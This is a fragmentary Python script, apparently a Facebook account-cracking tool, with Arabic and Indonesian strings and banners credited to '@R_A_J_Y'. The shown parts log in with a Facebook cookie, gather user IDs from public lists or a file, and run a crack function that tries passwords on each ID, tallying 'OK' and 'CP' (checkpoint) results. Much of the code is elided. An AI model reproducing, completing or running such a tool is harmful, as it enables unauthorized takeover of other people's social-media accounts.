...
print('')
print(f'''{C} \033[1;31m 𝐓𝐇𝐄 𝐃𝐀𝐓𝐄 \x1b[1;38;5;121m    \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time2} \x1b[1;38;5;121m 𖣎''')
print('')
print(f'''{C} \033[1;31m 𝑇𝐻𝐸 𝑇𝐼𝑀𝐸 \x1b[1;38;5;121m    \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time3} \x1b[1;38;5;121m 𖣎''')
print('')
		...
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			...
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				...
				if 'Sukses!' in str(response6):
					...
					print(f'\n[!] Login....✓تم تسجيل اعد تشغيل اداة')
				else:
					exit('\n[+] login Xلم يتم تسجيل بنجاح غير الكوكيز وحاول مره اخرى')
...
def public():
	...
	for userr in uid:
		try:
			...
			print('[•] Total Idعدد ايدياتك :{h} '+str(len(id)))
			setting()
...
def TakeFile():
	...
	try:
		...
		print('[•] Total Idعدد الايديات : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print('[✘] No Connection  ')
			exit()
...
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh,ss,bb,cc,zz,aa,ee,a1,a2,a3,a4,a5,a6,a7,a9,a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a20,a21,a22,a23,a24,a25,a26,a27,a30,a31,a32,a33,a34,a35,a36,a37,a38,a39,a40])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s{ [☬➺ᖇᗩᒍY𖤍] %s/%s ➙ [OK] %s ➙ [CP] %s .. } %s%s%s' % (bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
➺ᖇᗩᒍY  - @R_A_J_Y @R_A_J_Y					
					...
					cetak(nel(statuscp1, title='RAJY--CP'))
...
➺ᖇᗩᒍY  - @R_A_J_Y @R_A_J_Y					
					...
					cetak(nel(statusok1, title='RAJY--OK'))
